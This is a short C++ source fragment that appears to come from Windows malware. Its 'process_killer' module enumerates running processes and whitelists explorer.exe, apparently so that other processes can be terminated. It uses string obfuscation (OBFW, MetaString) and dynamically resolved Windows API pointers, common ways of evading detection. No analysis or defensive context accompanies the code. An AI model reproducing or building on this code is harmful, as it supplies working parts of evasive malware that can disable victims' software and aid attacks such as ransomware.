#include "prockiller.h"
#include <TlHelp32.h>
#include <winternl.h>
#include "../api/getapi.h"
#include "../obfuscation/MetaString.h"
#include "../memory.h"

VOID 
process_killer::GetWhiteListProcess(__out PPID_LIST PidList)
{
	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == NULL) {
		return;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (!pProcess32FirstW(hSnapShot, &pe32)) {

		pCloseHandle(hSnapShot);
		return;

	}

	do
	{

		if (!plstrcmpiW(pe32.szExeFile, OBFW(L"explorer.exe"))) {

			PPID Pid = (PPID)m_malloc(sizeof(PID));
			if (!Pid) {
				break;
			}

			Pid->dwProcessId = pe32.th32ProcessID;
			TAILQ_INSERT_TAIL(PidList, Pid, Entries);

		}

	} while (pProcess32NextW(hSnapShot, &pe32));

	pCloseHandle(hSnapShot);
}